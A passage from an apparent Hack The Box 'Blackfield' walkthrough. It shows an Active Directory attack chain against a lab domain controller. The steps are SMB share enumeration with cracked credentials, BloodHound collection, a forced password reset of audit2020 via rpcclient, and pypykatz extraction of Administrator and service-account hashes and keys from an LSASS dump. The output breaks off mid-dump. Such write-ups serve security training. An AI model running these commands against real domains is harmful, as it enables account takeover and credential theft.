Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1  
Candidate.Engine.: Device Generator  
Candidates.#01...: $CaRaMeL -> #!hottie  
Hardware.Mon.#01.: Temp: 72c Util: 70%  
  
Started: Thu Jun 11 22:00:46 2026  
Stopped: Thu Jun 11 22:00:59 2026
```

We got our password : `#00^BlackKnight`.
And our username from the ticket `support` from `support@BLACKFIELD.LOCAL`.

We'll try `netexec` with this combination :

```bash
>  nxc smb 10.129.229.17 -u support -p '#00^BlackKnight' --shares  
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight    
SMB         10.129.229.17   445    DC01             [*] Enumerated shares  
SMB         10.129.229.17   445    DC01             Share           Permissions     Remark  
SMB         10.129.229.17   445    DC01             -----           -----------     ------  
SMB         10.129.229.17   445    DC01             ADMIN$                          Remote Admin  
SMB         10.129.229.17   445    DC01             C$                              Default share  
SMB         10.129.229.17   445    DC01             forensic                        Forensic / Audit share.  
SMB         10.129.229.17   445    DC01             IPC$            READ            Remote IPC  
SMB         10.129.229.17   445    DC01             NETLOGON        READ            Logon server share    
SMB         10.129.229.17   445    DC01             profiles$       READ               
SMB         10.129.229.17   445    DC01             SYSVOL          READ            Logon server share
```

We have `READ` on `NETLOGON` and `SYSVOL` and we got our first actual `user`.

Time to use `bloodhound` to see `support`'s `Outbound Control` privileges :

First, we download the database :

```bash
>  bloodhound-python -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.129.229.17 -c All --zip  
  
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)  
INFO: Found AD domain: blackfield.local  
INFO: Getting TGT for user  
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.blackfield.local:88)] [Errno -2] Name or service not known  
INFO: Connecting to LDAP server: dc01.blackfield.local  
INFO: Testing resolved hostname connectivity dead:beef::75fb:1ed7:8dd6:be87  
INFO: Trying LDAP connection to dead:beef::75fb:1ed7:8dd6:be87  
INFO: Found 1 domains  
INFO: Found 1 domains in the forest  
INFO: Found 18 computers  
INFO: Connecting to LDAP server: dc01.blackfield.local  
INFO: Testing resolved hostname connectivity dead:beef::75fb:1ed7:8dd6:be87  
INFO: Trying LDAP connection to dead:beef::75fb:1ed7:8dd6:be87  
INFO: Found 316 users  
INFO: Found 52 groups  
INFO: Found 2 gpos  
INFO: Found 1 ous  
INFO: Found 19 containers  
INFO: Found 0 trusts  
INFO: Starting computer enumeration with 10 workers  
INFO: Querying computer:    
INFO: Querying computer:    
INFO: Querying computer:    
INFO: Querying computer:    
INFO: Querying computer:    
INFO: Querying computer:    
INFO: Querying computer:    
INFO: Querying computer:    
INFO: Querying computer:    
INFO: Querying computer:    
INFO: Querying computer:    
INFO: Querying computer:    
INFO: Querying computer:    
INFO: Querying computer:    
INFO: Querying computer:    
INFO: Querying computer:    
INFO: Querying computer:    
INFO: Querying computer: DC01.BLACKFIELD.local  
INFO: Done in 00M 36S  
INFO: Compressing output into 20260611221758_bloodhound.zip
```

We add `DC01.BLACKFIELD.local` to our hosts :

```bash
>  echo "10.129.229.17 blackfield.htb BLACKFIELD.local DC01.BLACKFIELD.local" | sudo tee -a /etc/hosts  
Please touch the FIDO authenticator.  
10.129.229.17 blackfield.htb BLACKFIELD.local DC01.BLACKFIELD.local
```

And we open the database in `bloodhound`.

We have `ForceChangePassword` on `audit2020`

We check the password policy :

```bash
>  nxc smb 10.129.229.17 -u support -p '#00^BlackKnight' --pass-pol  
  
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight    
SMB         10.129.229.17   445    DC01             [+] Dumping password info for domain: BLACKFIELD  
SMB         10.129.229.17   445    DC01             Minimum password length: 7  
SMB         10.129.229.17   445    DC01             Password history length: 24  
SMB         10.129.229.17   445    DC01             Maximum password age: 41 days 23 hours 53 minutes    
SMB         10.129.229.17   445    DC01                
SMB         10.129.229.17   445    DC01             Password Complexity Flags: 000001  
SMB         10.129.229.17   445    DC01                 Domain Refuse Password Change: 0  
SMB         10.129.229.17   445    DC01                 Domain Password Store Cleartext: 0  
SMB         10.129.229.17   445    DC01                 Domain Password Lockout Admins: 0  
SMB         10.129.229.17   445    DC01                 Domain Password No Clear Change: 0  
SMB         10.129.229.17   445    DC01                 Domain Password No Anon Change: 0  
SMB         10.129.229.17   445    DC01                 Domain Password Complex: 1  
SMB         10.129.229.17   445    DC01                
SMB         10.129.229.17   445    DC01             Minimum password age: 1 day 4 minutes    
SMB         10.129.229.17   445    DC01             Reset Account Lockout Counter: 30 minutes    
SMB         10.129.229.17   445    DC01             Locked Account Duration: 30 minutes    
SMB         10.129.229.17   445    DC01             Account Lockout Threshold: None  
SMB         10.129.229.17   445    DC01             Forced Log off Time: Not Set
```

And we change the password to access our new user :

```bash
>  rpcclient -U 'BLACKFIELD/support%#00^BlackKnight' 10.129.229.17 -c 'setuserinfo2 audit2020 23 "Skelet0nephilim"'  
>  nxc smb 10.129.229.17 -u audit2020 -p 'Skelet0nephilim' --shares  
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\audit2020:Skelet0nephilim    
SMB         10.129.229.17   445    DC01             [*] Enumerated shares  
SMB         10.129.229.17   445    DC01             Share           Permissions     Remark  
SMB         10.129.229.17   445    DC01             -----           -----------     ------  
SMB         10.129.229.17   445    DC01             ADMIN$                          Remote Admin  
SMB         10.129.229.17   445    DC01             C$                              Default share  
SMB         10.129.229.17   445    DC01             forensic        READ            Forensic / Audit share.  
SMB         10.129.229.17   445    DC01             IPC$            READ            Remote IPC  
SMB         10.129.229.17   445    DC01             NETLOGON        READ            Logon server share    
SMB         10.129.229.17   445    DC01             profiles$       READ               
SMB         10.129.229.17   445    DC01             SYSVOL          READ            Logon server share
```

We have `READ` on `forensic` which should be interesting.

```bash
>  smbclient //10.129.229.17/forensic -U audit2020%Skelet0nephilim  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Sun Feb 23 14:03:16 2020  
 ..                                  D        0  Sun Feb 23 14:03:16 2020  
 commands_output                     D        0  Sun Feb 23 19:14:37 2020  
 memory_analysis                     D        0  Thu May 28 22:28:33 2020  
 tools                               D        0  Sun Feb 23 14:39:08 2020  
  
               5102079 blocks of size 4096. 1694654 blocks available  
smb: \> cd tools  
smb: \tools\> ls  
 .                                   D        0  Sun Feb 23 14:39:08 2020  
 ..                                  D        0  Sun Feb 23 14:39:08 2020  
 sleuthkit-4.8.0-win32               D        0  Sun Feb 23 14:39:03 2020  
 sysinternals                        D        0  Sun Feb 23 14:35:25 2020  
 volatility                          D        0  Sun Feb 23 14:35:39 2020  
  
               5102079 blocks of size 4096. 1694654 blocks available  
smb: \tools\> cd sleuthkit-4.8.0-win32  
smb: \tools\sleuthkit-4.8.0-win32\> ls  
 .                                   D        0  Sun Feb 23 14:39:03 2020  
 ..                                  D        0  Sun Feb 23 14:39:03 2020  
 bin                                 D        0  Sun Feb 23 14:39:02 2020  
 lib                                 D        0  Sun Feb 23 14:39:02 2020  
 licenses                            D        0  Sun Feb 23 14:39:03 2020  
 NEWS.txt                            A    87015  Sun Feb 23 14:38:57 2020  
 README-win32.txt                    A     2324  Sun Feb 23 14:38:57 2020  
 README.txt                          A     8316  Sun Feb 23 14:38:57 2020  
  
               5102079 blocks of size 4096. 1694654 blocks available  
smb: \tools\sleuthkit-4.8.0-win32\>get NEWS.txt  
getting file \tools\sleuthkit-4.8.0-win32\NEWS.txt of size 87015 as NEWS.txt (79.5 KiloBytes/sec) (average 79.5 KiloBytes/sec)  
smb: \tools\sleuthkit-4.8.0-win32\> get README-win32.txt  
getting file \tools\sleuthkit-4.8.0-win32\README-win32.txt of size 2324 as README-win32.txt (9.9 KiloBytes/sec) (average 67.2 KiloBytes/sec)  
smb: \tools\sleuthkit-4.8.0-win32\> get README.txt  
getting file \tools\sleuthkit-4.8.0-win32\README.txt of size 8316 as README.txt (29.7 KiloBytes/sec) (average 60.7 KiloBytes/sec)  
smb: \tools\sleuthkit-4.8.0-win32\> cd licenses  
smb: \tools\sleuthkit-4.8.0-win32\licenses\> ls  
 .                                   D        0  Sun Feb 23 14:39:03 2020  
 ..                                  D        0  Sun Feb 23 14:39:03 2020  
 cpl1.0.txt                          A    11613  Sun Feb 23 14:39:03 2020  
 IBM-LICENSE                         A    11954  Sun Feb 23 14:39:03 2020  
  
               5102079 blocks of size 4096. 1694654 blocks available  
smb: \tools\sleuthkit-4.8.0-win32\licenses\> get cpl1.0.txt  
getting file \tools\sleuthkit-4.8.0-win32\licenses\cpl1.0.txt of size 11613 as cpl1.0.txt (43.6 KiloBytes/sec) (average 58.3 KiloBytes/sec)  
smb: \tools\sleuthkit-4.8.0-win32\licenses\> get IBM-LICENSE  
getting file \tools\sleuthkit-4.8.0-win32\licenses\IBM-LICENSE of size 11954 as IBM-LICENSE (39.8 KiloBytes/sec) (average 55.7 KiloBytes/sec)
```

Here we got our first sweep.

```bash
>  smbclient //10.129.229.17/forensic -U 'BLACKFIELD\audit2020%Skelet0nephilim'  
  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Sun Feb 23 14:03:16 2020  
 ..                                  D        0  Sun Feb 23 14:03:16 2020  
 commands_output                     D        0  Sun Feb 23 19:14:37 2020  
 memory_analysis                     D        0  Thu May 28 22:28:33 2020  
 tools                               D        0  Sun Feb 23 14:39:08 2020  
  
               5102079 blocks of size 4096. 1694654 blocks available  
smb: \> cd memory_analysis  
smb: \memory_analysis\> ls  
 .                                   D        0  Thu May 28 22:28:33 2020  
 ..                                  D        0  Thu May 28 22:28:33 2020  
 conhost.zip                         A 37876530  Thu May 28 22:25:36 2020  
 ctfmon.zip                          A 24962333  Thu May 28 22:25:45 2020  
 dfsrs.zip                           A 23993305  Thu May 28 22:25:54 2020  
 dllhost.zip                         A 18366396  Thu May 28 22:26:04 2020  
 ismserv.zip                         A  8810157  Thu May 28 22:26:13 2020  
 lsass.zip                           A 41936098  Thu May 28 22:25:08 2020  
 mmc.zip                             A 64288607  Thu May 28 22:25:25 2020  
 RuntimeBroker.zip                   A 13332174  Thu May 28 22:26:24 2020  
 ServerManager.zip                   A 131983313  Thu May 28 22:26:49 2020  
 sihost.zip                          A 33141744  Thu May 28 22:27:00 2020  
 smartscreen.zip                     A 33756344  Thu May 28 22:27:11 2020  
 svchost.zip                         A 14408833  Thu May 28 22:27:19 2020  
 taskhostw.zip                       A 34631412  Thu May 28 22:27:30 2020  
 winlogon.zip                        A 14255089  Thu May 28 22:27:38 2020  
 wlms.zip                            A  4067425  Thu May 28 22:27:44 2020  
 WmiPrvSE.zip                        A 18303252  Thu May 28 22:27:53 2020  
  
               5102079 blocks of size 4096. 1694654 blocks available  
smb: \memory_analysis\> get lsass.zip  
parallel_read returned NT_STATUS_IO_TIMEOUT
```

We got a timeout, so we'll add `-t 1200` :

```bash
>  smbclient //10.129.229.17/forensic -U 'BLACKFIELD\audit2020%Skelet0nephilim' -t 1200  
  
Try "help" to get a list of possible commands.  
smb: \> cd memory_analysis  
smb: \memory_analysis\> get lsass.zip  
getting file \memory_analysis\lsass.zip of size 41936098 as lsass.zip (1308.8 KiloBytes/sec) (average 1308.8 KiloBytes/sec)  
smb: \memory_analysis\> exit  
>  mkdir -p /tmp/blackforensic  
>  mv lsass.zip /tmp/blackforensic/  
>  cd /tmp/blackforensic  
>  ls  
lsass.zip
```

And we got it.

```bash
>  unzip -l lsass.zip  
Archive:  lsass.zip  
 Length      Date    Time    Name  
---------  ---------- -----   ----  
143044222  2020-02-23 11:02   lsass.DMP  
---------                     -------  
143044222                     1 file  
>  unzip -o lsass.zip  
Archive:  lsass.zip  
 inflating: lsass.DMP                  
>  pypykatz lsa minidump lsass.DMP  
INFO:pypykatz:Parsing file lsass.DMP  
FILE: ======== lsass.DMP =======  
== LogonSession ==  
authentication_id 406458 (633ba)  
session_id 2  
username svc_backup  
domainname BLACKFIELD  
logon_server DC01  
logon_time 2020-02-23T18:00:03.423728+00:00  
sid S-1-5-21-4194615774-2175524697-3563712290-1413  
luid 406458  
       == MSV ==  
               Username: svc_backup  
               Domain: BLACKFIELD  
               LM: NA  
               NT: 9658d1d1dcd9250115e2205d9f48400d  
               SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c  
               DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000  
       == WDIGEST [633ba]==  
               username svc_backup  
               domainname BLACKFIELD  
               password None  
               password (hex)  
       == Kerberos ==  
               Username: svc_backup  
               Domain: BLACKFIELD.LOCAL  
               AES128 Key: 9658d1d1dcd9250115e2205d9f48400d  
               AES256 Key: 20a3e879a3a0ca4f51db1e63514a27ac18eef553d8f30c29805c398c97599e91  
       == WDIGEST [633ba]==  
               username svc_backup  
               domainname BLACKFIELD  
               password None  
               password (hex)  
  
== LogonSession ==  
authentication_id 365835 (5950b)  
session_id 2  
username UMFD-2  
domainname Font Driver Host  
logon_server    
logon_time 2020-02-23T17:59:38.218491+00:00  
sid S-1-5-96-0-2  
luid 365835  
       == MSV ==  
               Username: DC01$  
               Domain: BLACKFIELD  
               LM: NA  
               NT: b624dc83a27cc29da11d9bf25efea796  
               SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d  
               DPAPI: 0000000000000000000000000000000000000000  
       == WDIGEST [5950b]==  
               username DC01$  
               domainname BLACKFIELD  
               password None  
               password (hex)  
       == Kerberos ==  
               Username: DC01$  
               Domain: BLACKFIELD.local  
               Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d004800  
3a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a0028  
00620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d00  
48003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a  
002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               AES128 Key: b624dc83a27cc29da11d9bf25efea796  
               AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44  
       == WDIGEST [5950b]==  
               username DC01$  
               domainname BLACKFIELD  
               password None  
               password (hex)  
  
== LogonSession ==  
authentication_id 365493 (593b5)  
session_id 2  
username UMFD-2  
domainname Font Driver Host  
logon_server    
logon_time 2020-02-23T17:59:38.200147+00:00  
sid S-1-5-96-0-2  
luid 365493  
       == MSV ==  
               Username: DC01$  
               Domain: BLACKFIELD  
               LM: NA  
               NT: b624dc83a27cc29da11d9bf25efea796  
               SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d  
               DPAPI: 0000000000000000000000000000000000000000  
       == WDIGEST [593b5]==  
               username DC01$  
               domainname BLACKFIELD  
               password None  
               password (hex)  
       == Kerberos ==  
               Username: DC01$  
               Domain: BLACKFIELD.local  
               Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d004800  
3a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a0028  
00620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d00  
48003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a  
002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               AES128 Key: b624dc83a27cc29da11d9bf25efea796  
               AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44  
       == WDIGEST [593b5]==  
               username DC01$  
               domainname BLACKFIELD  
               password None  
               password (hex)  
  
== LogonSession ==  
authentication_id 257142 (3ec76)  
session_id 0  
username DC01$  
domainname BLACKFIELD  
logon_server    
logon_time 2020-02-23T17:59:13.318909+00:00  
sid S-1-5-18  
luid 257142  
       == Kerberos ==  
               Username: DC01$  
               Domain: BLACKFIELD.LOCAL  
  
== LogonSession ==  
authentication_id 153705 (25869)  
session_id 1  
username Administrator  
domainname BLACKFIELD  
logon_server DC01  
logon_time 2020-02-23T17:59:04.506080+00:00  
sid S-1-5-21-4194615774-2175524697-3563712290-500  
luid 153705  
       == MSV ==  
               Username: Administrator  
               Domain: BLACKFIELD  
               LM: NA  
               NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62  
               SHA1: db5c89a961644f0978b4b69a4d2a2239d7886368  
               DPAPI: 240339f898b6ac4ce3f34702e4a8955000000000  
       == WDIGEST [25869]==  
               username Administrator  
               domainname BLACKFIELD  
               password None  
               password (hex)  
       == Kerberos ==  
               Username: Administrator  
               Domain: BLACKFIELD.LOCAL  
               AES128 Key: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62  
               AES256 Key: ec841e1e29ad7d6332a243b6b4ab445839829244408269850ab7c78a2cf45615  
       == WDIGEST [25869]==  
               username Administrator  
               domainname BLACKFIELD  
               password None  
               password (hex)  
       == DPAPI [25869]==  
               luid 153705  
               key_guid d1f69692-cfdc-4a80-959e-bab79c9c327e  
               masterkey 769c45bf7ceb3c0e28fb78f2e355f7072873930b3c1d3aef0e04ecbb3eaf16aa946e553007259bf307eb740f222decadd996ed660ffe648b0440d84cd97bf5a5  
               sha1_masterkey d04452f8459a46460939ced67b971bcf27cb2fb9  
  
== LogonSession ==  
authentication_id 137110 (21796)  
session_id 0  
username DC01$  
domainname BLACKFIELD  
logon_server    
logon_time 2020-02-23T17:58:27.068590+00:00  
sid S-1-5-18  
luid 137110  
       == Kerberos ==  
               Username: DC01$  
               Domain: BLACKFIELD.LOCAL  
  
== LogonSession ==  
authentication_id 134695 (20e27)  
session_id 0  
username DC01$  
domainname BLACKFIELD  
logon_server    
logon_time 2020-02-23T17:58:26.678019+00:00  
sid S-1-5-18  
luid 134695  
       == Kerberos ==  
               Username: DC01$  
               Domain: BLACKFIELD.LOCAL  
  
== LogonSession ==  
authentication_id 40310 (9d76)  
session_id 1  
username DWM-1  
domainname Window Manager  
logon_server    
logon_time 2020-02-23T17:57:46.897202+00:00  
sid S-1-5-90-0-1  
luid 40310  
       == MSV ==  
               Username: DC01$  
               Domain: BLACKFIELD  
               LM: NA  
               NT: b624dc83a27cc29da11d9bf25efea796  
               SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d  
               DPAPI: 0000000000000000000000000000000000000000  
       == WDIGEST [9d76]==  
               username DC01$  
               domainname BLACKFIELD  
               password None  
               password (hex)  
       == Kerberos ==  
               Username: DC01$  
               Domain: BLACKFIELD.local  
               Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d004800  
3a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a0028  
00620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d00  
48003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a  
002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               AES128 Key: b624dc83a27cc29da11d9bf25efea796  
               AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44  
       == WDIGEST [9d76]==  
               username DC01$  
               domainname BLACKFIELD  
               password None  
               password (hex)  
  
== LogonSession ==  
authentication_id 40232 (9d28)  
session_id 1  
username DWM-1  
domainname Window Manager  
logon_server    
logon_time 2020-02-23T17:57:46.897202+00:00  
sid S-1-5-90-0-1  
luid 40232  
       == MSV ==  
               Username: DC01$  
               Domain: BLACKFIELD  
               LM: NA  
               NT: b624dc83a27cc29da11d9bf25efea796  
               SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d  
               DPAPI: 0000000000000000000000000000000000000000  
       == WDIGEST [9d28]==  
               username DC01$  
               domainname BLACKFIELD  
               password None  
               password (hex)  
       == Kerberos ==  
               Username: DC01$  
               Domain: BLACKFIELD.local  
               Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d004800  
3a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a0028  
00620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d00  
48003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a  
002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               AES128 Key: b624dc83a27cc29da11d9bf25efea796  
               AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44  
       == WDIGEST [9d28]==  
               username DC01$  
               domainname BLACKFIELD  
               password None  
               password (hex)  
  
== LogonSession ==  
authentication_id 996 (3e4)  
session_id 0  
username DC01$  
domainname BLACKFIELD  
logon_server    
logon_time 2020-02-23T17:57:46.725846+00:00  
sid S-1-5-20  
luid 996  
       == MSV ==  
               Username: DC01$  
               Domain: BLACKFIELD  
               LM: NA  
               NT: b624dc83a27cc29da11d9bf25efea796  
               SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d  
               DPAPI: 0000000000000000000000000000000000000000  
       == WDIGEST [3e4]==  
               username DC01$  
               domainname BLACKFIELD  
               password None  
               password (hex)  
       == Kerberos ==  
               Username: dc01$  
               Domain: BLACKFIELD.local  
               Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d004800  
3a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a0028  
00620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d00  
48003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a  
002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               AES128 Key: b624dc83a27cc29da11d9bf25efea796  
               AES256 Key: ae7032a985fe7303c182f82d15df15b1ccf731c7f33947e3bd2f193d12d9d684  
       == WDIGEST [3e4]==  
               username DC01$  
               domainname BLACKFIELD  
               password None  
               password (hex)  
  
== LogonSession ==  
authentication_id 24410 (5f5a)  
session_id 1  
username UMFD-1  
domainname Font Driver Host  
logon_server    
logon_time 2020-02-23T17:57:46.569111+00:00  
sid S-1-5-96-0-1  
luid 24410  
       == MSV ==  
               Username: DC01$  
               Domain: BLACKFIELD  
               LM: NA  
               NT: b624dc83a27cc29da11d9bf25efea796  
               SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d  
               DPAPI: 0000000000000000000000000000000000000000  
       == WDIGEST [5f5a]==  
               username DC01$  
               domainname BLACKFIELD  
               password None  
               password (hex)  
       == Kerberos ==  
               Username: DC01$  
               Domain: BLACKFIELD.local  
               Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d004800  
3a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a0028  
00620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d00  
48003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a  
002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               AES128 Key: b624dc83a27cc29da11d9bf25efea796  
               AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44  
       == WDIGEST [5f5a]==  
               username DC01$  
               domainname BLACKFIELD  
               password None  
               password (hex)  
  
== LogonSession ==  
authentication_id 406499 (633e3)  
session_id 2  
username svc_backup  
domainname BLACKFIELD  
logon_server DC01  
logon_time 2020-02-23T18:00:03.423728+00:00  
sid S-1-5-21-4194615774-2175524697-3563712290-1413  
luid 406499  
       == MSV ==  
               Username: svc_backup  
               Domain: BLACKFIELD  
               LM: NA  
               NT: 9658d1d1dcd9250115e2205d9f48400d  
               SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c  
               DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000  
       == WDIGEST [633e3]==  
               username svc_backup  
               domainname BLACKFIELD  
               password None  
               password (hex)  
       == Kerberos ==  
               Username: svc_backup  
               Domain: BLACKFIELD.LOCAL  
               AES128 Key: 9658d1d1dcd9250115e2205d9f48400d  
               AES256 Key: 20a3e879a3a0ca4f51db1e63514a27ac18eef553d8f30c29805c398c97599e91  
       == WDIGEST [633e3]==  
               username svc_backup  
               domainname BLACKFIELD  
               password None  
               password (hex)  
       == DPAPI [633e3]==  
               luid 406499  
               key_guid 836e8326-d136-4b9f-94c7-3353c4e45770  
               masterkey 0ab34d5f8cb6ae5ec44a4cb49ff60c8afdf0b465deb9436eebc2fcb1999d5841496c3ffe892b0a6fed6742b1e13a5aab322b6ea50effab71514f3dbeac025bdf  
               sha1_masterkey 6efc8aa0abb1f2c19e101fbd9bebfb0979c4a991  
  
== LogonSession ==  
authentication_id 366665 (59849)  
session_id 2  
username DWM-2  
domainname Window Manager  
logon_server    
logon_time 2020-02-23T17:59:38.293877+00:00  
sid S-1-5-90-0-2  
luid 366665  
       == MSV ==  
               Username: DC01$  
               Domain: BLACKFIELD  
               LM: NA  
               NT: b624dc83a27cc29da11d9bf25efea796  
               SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d  
               DPAPI: 0000000000000000000000000000000000000000  
       == WDIGEST [59849]==  
               username DC01$  
               domainname BLACKFIELD  
               password None  
               password (hex)  
       == Kerberos ==  
               Username: DC01$  
               Domain: BLACKFIELD.local  
               Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d004800  
3a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a0028  
00620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d00  
48003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a  
002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600  
               AES128 Key: b624dc83a27cc29da11d9bf25efea796  
               AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44  
       == WDIGEST [59849]==  
               username DC01$  
               domainname BLACKFIELD  
               password None  
               password (hex)  
  
== LogonSession ==  
authentication_id 366649 (59839)  
session_id 2  
username DWM-2  
domainname Window Manager  
logon_server    
logon_time 2020-02-23T17:59:38.293877+00:00  
sid S-1-5-90-0-2  
luid 366649  
       == MSV ==  
               Username: DC01$  
               Domain: BLACKFIELD  
               LM: NA  
               NT: b624dc83a27cc29da11d9bf25efea796  
               SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d  
               DPAPI: 0000000000000000000000000000000000000000  
       == WDIGEST [59839]==  
               username DC01$  
               domainname BLACKFIELD  
               password None  
               password (hex)  
       == Kerberos ==  
               Username: DC01$  
               Domain: BLACKFIELD.local  
